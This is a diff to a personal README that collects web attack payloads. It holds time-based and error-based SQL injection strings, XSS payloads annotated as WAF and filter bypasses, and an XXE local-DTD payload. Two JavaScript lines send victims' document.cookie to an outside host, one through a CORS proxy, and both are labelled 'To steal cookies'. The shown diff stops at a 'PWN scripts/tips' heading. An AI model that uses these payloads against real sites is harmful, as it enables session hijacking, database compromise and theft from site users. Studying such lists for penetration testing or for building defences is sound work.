@@ -1,21 +1,23 @@
 ## Just a useless set of payload used by me. Saved here for remembrance.
+##### Payloads List
+* SQL Injection
+  * Time Based Blind:
+    - `(select(if(user()like(user()),sleep(4),sleep(2))))`
+    - `x' AND (SELECT 4321 FROM (SELECT(SLEEP(2-(IF(20=20,0,5)))))x)-- asd`
+    - `x' AND (SELECT 2312 FROM (SELECT(SLEEP(2)))asd)-- dsa`
+  * Error Based:
+    - `x'.and.(select.count(*).from.shouldNotExistTable)=1.or.'1'='0.` (this is for error based sqli and should return error like : "Table 'x.shouldNotExistTable' doesn't exist")
 
-### SQL Injection
-#### Time Based Blind:
- - `(select(if(user()like(user()),sleep(4),sleep(2))))` (Timed Based Blind)
- - `x'.and.(select.count(*).from.shouldNotExistTable)=1.or.'1'='0.` (this is for error based sqli and should return error like : "Table 'x.shouldNotExistTable' doesn't exist")
- - `x' AND (SELECT 4321 FROM (SELECT(SLEEP(2-(IF(20=20,0,5)))))x)-- asd` (Timed Based Blind)
- - `x' AND (SELECT 2312 FROM (SELECT(SLEEP(2)))asd)-- dsa` (Timed Based Blind)
+* Cross Site Scripting
+  - `[document.domain].find(confirm)` (helped me to bypass WAFs/filters or useful if input is echoed or used as variable in js files)
+  - `['h0nus'].find(window[String.fromCharCode(97,108,101,114,116)])` (pops an alert with h0nus string :) useful for waf bypasses or evade checks)
+  - `('asd').link(eval("var asd=new Function('return prompt(\"h0nus\")'); asd();"))` (pops a prompt with h0nus string )
+  - `('asd').anchor(prompt());` (just pops a prompt) 
+  - `var url="https://any.host.name/",params="asd="+document.cookie,http=new XMLHttpRequest;http.open("GET",url+"?"+params,!0),http.send(null);` To steal cookies
+  - `var url="https://cors-anywhere.herokuapp.com/https://any.host.name/",params="asd="+document.cookie,http=new XMLHttpRequest;http.open("GET",url+"?"+params,!0),http.send(null);` To steal cookies and bypass/beat CORS
 
-### Cross Site Scripting
- - `[document.domain].find(confirm)` (helped me to bypass WAFs/filters or useful if input is echoed or used as variable in js files)
- - `['h0nus'].find(window[String.fromCharCode(97,108,101,114,116)])` (pops an alert with h0nus string :) useful for waf bypasses or evade checks)
- - `('asd').link(eval("var asd=new Function('return prompt(\"h0nus\")'); asd();"))` (pops a prompt with h0nus string )
- - `('asd').anchor(prompt());` (just pops a prompt) 
- - `var url="https://any.host.name/",params="asd="+document.cookie,http=new XMLHttpRequest;http.open("GET",url+"?"+params,!0),http.send(null);` To steal cookies
- - `var url="https://cors-anywhere.herokuapp.com/https://any.host.name/",params="asd="+document.cookie,http=new XMLHttpRequest;http.open("GET",url+"?"+params,!0),http.send(null);` To steal cookies and bypass/beat CORS
-### XML External Entity
-```xml
+* XML External Entity
+  * ```xml
 <?xml version="1.0" ?>
 <!DOCTYPE message [
 <!ENTITY % local_dtd SYSTEM "https://docs.oracle.com/cd/E13153_01/wlcp/wlss40/sip-app_1_0.dtd.txt">
@@ -28,10 +30,8 @@
 <!ELEMENT aa (bb'>
 %local_dtd;
 ]>
-``` 
- - (Used when i had no space left for internal entities into payload/dtd) 
-
- -  `<![CDATA[ <script>prompt(2)</script> ]]>` (Sometimes WAFS block by keywords like DOCTYPE, ENTITY & ect, but you can inject into `<![CDATA[X]]>` )
+``` (Used when i had no space left for internal entities into payload/dtd) 
+  * `<![CDATA[ <script>prompt(2)</script> ]]>` (Sometimes WAFS block by keywords like DOCTYPE, ENTITY & ect, but you can inject into `<![CDATA[X]]>` )
 
 ### PWN scripts/tips
 * Oracle DB:
